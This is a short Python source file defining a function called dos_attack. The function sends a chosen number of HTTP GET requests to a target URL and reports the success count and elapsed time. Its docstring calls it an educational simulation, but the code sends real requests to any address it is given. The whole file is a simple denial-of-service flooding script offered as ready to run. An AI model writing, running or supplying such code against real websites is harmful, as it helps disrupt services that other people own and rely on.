import requests
import time

def dos_attack(url, power):
    """
    Simulates a DOS attack by sending multiple requests to a target URL.
    This is for educational purposes only.
    """
    try:
        # Convert power to integer
        num_requests = int(power)

        print(f"Sending {num_requests} requests to {url}")

        start_time = time.time()
        successful_requests = 0

        for i in range(num_requests):
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    successful_requests += 1
                print(f"Request {i+1}/{num_requests} - Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Request {i+1} failed: {str(e)}")
                continue

        end_time = time.time()
        duration = end_time - start_time

        print(f"Attack completed in {duration:.2f} seconds")
        print(f"Successful requests: {successful_requests}/{num_requests}")

        return f"Sent {num_requests} requests in {duration:.2f} seconds"

    except Exception as e:
        print(f"Error in DOS attack: {str(e)}")
        return f"Attack failed: {str(e)}"
